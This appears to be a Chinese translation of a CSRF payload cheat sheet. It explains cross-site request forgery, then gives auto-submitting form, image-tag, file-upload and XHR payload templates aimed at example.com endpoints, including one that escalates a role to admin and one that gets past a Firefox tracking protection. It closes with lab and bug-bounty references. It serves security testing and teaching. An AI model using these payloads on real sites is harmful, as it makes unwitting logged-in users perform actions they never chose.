# 跨站请求伪造 (CSRF)

> 跨站请求伪造(CSRF/XSRF)是一种攻击，它强制终端用户在已认证的Web应用程序上执行非预期的操作。CSRF攻击特别针对状态变更请求，而不是数据窃取，因为攻击者无法看到伪造请求的响应。 - OWASP

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [HTML GET - 需要用户交互](#html-get---需要用户交互)
    * [HTML GET - 无需用户交互](#html-get---无需用户交互)
    * [HTML POST - 需要用户交互](#html-post---需要用户交互)
    * [HTML POST - 自动提交 - 无需用户交互](#html-post---自动提交---无需用户交互)
    * [HTML POST - 带文件上传的multipart/form-data - 需要用户交互](#html-post---带文件上传的multipartform-data---需要用户交互)
    * [JSON GET - 简单请求](#json-get---简单请求)
    * [JSON POST - 简单请求](#json-post---简单请求)
    * [JSON POST - 复杂请求](#json-post---复杂请求)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - 主要的跨站请求伪造审计和利用工具包。

## 方法学

![CSRF速查表](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)

当您登录某个网站时，通常会有一个会话。该会话的标识符存储在浏览器的cookie中，并在每次向该站点发送请求时一起发送。即使是由其他网站触发的请求，cookie也会随请求一起发送，并且该请求会被视为已登录用户执行的操作。

### HTML GET - 需要用户交互

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">点击我</a>
```

### HTML GET - 无需用户交互

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - 需要用户交互

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="提交请求" />
</form>
```

### HTML POST - 自动提交 - 无需用户交互

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="提交请求" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### HTML POST - 带文件上传的multipart/form-data - 需要用户交互

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF文件内容" ], "CSRF文件名" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<目标>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">提交请求</button>
```

### JSON GET - 简单请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - 简单请求

使用XHR：

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
// 简单请求中不允许使用application/json。text/plain是默认值
xhr.setRequestHeader("Content-Type", "text/plain");
// 您可能还想尝试以下一个或两个
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

使用自动提交表单，可绕过某些浏览器保护，如Firefox浏览器中[增强型跟踪保护](https://support.mozilla.org/zh-CN/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection)的标准选项：

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
<!-- 此输入将发送：{"role":admin,"other":"="} -->
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - 复杂请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## 实验环境

* [PortSwigger - 无防御的CSRF漏洞](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [PortSwigger - 令牌验证依赖于请求方法的CSRF](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [PortSwigger - 令牌验证依赖于令牌是否存在的CSRF](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [PortSwigger - 令牌未绑定到用户会话的CSRF](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [PortSwigger - 令牌绑定到非会话cookie的CSRF](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [PortSwigger - 令牌在cookie中重复的CSRF](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [PortSwigger - Referer验证依赖于请求头是否存在的CSRF](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [PortSwigger - Referer验证存在缺陷的CSRF](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

## 参考资料

* [跨站请求伪造速查表 - Alex Lauerman - 2016年4月3日](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
* [跨站请求伪造(CSRF) - OWASP - 2024年4月19日](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [Messenger.com CSRF漏洞 - Jack Whitton - 2015年7月26日](https://whitton.io/articles/messenger-site-wide-csrf/)
* [PayPal漏洞赏金：未经同意更新PayPal.me个人资料图片(CSRF攻击) - Florian Courtial - 2016年7月19日](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
* [一键入侵PayPal账户(已修复) - Yasser Ali - 2014年10月9日](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
* [添加推文到收藏夹的CSRF - Vijay Kumar (indoappsec) - 2015年11月21日](https://hackerone.com/reports/100820)
* [Facebookmarketingdevelopers.com：代理、CSRF困境和API乐趣 - phwd - 2015年10月16日](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
* [我是如何入侵您的Beats账户的？Apple漏洞赏金 - @aaditya_purani - 2016年7月20日](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
* [FORM POST JSON：POST Heartbeats API上的JSON CSRF - Eugene Yakovchuk - 2017年7月2日](https://hackerone.com/reports/245346)
* [使用Oculus-Facebook集成中的CSRF入侵Facebook账户 - Josip Franjkovic - 2018年1月15日](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
* [跨站请求伪造(CSRF) - Sjoerd Langkemper - 2019年1月9日](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
* [跨站请求伪造攻击 - PwnFunction - 2019年4月5日](https://www.youtube.com/watch?v=eWEgUcHPle0)
* [消除CSRF - Joe Rozner - 2017年10月17日](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
* [绕过CSRF的Referer检查逻辑 - hahwul - 2019年10月11日](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)

---

*最后更新: 2025年6月*
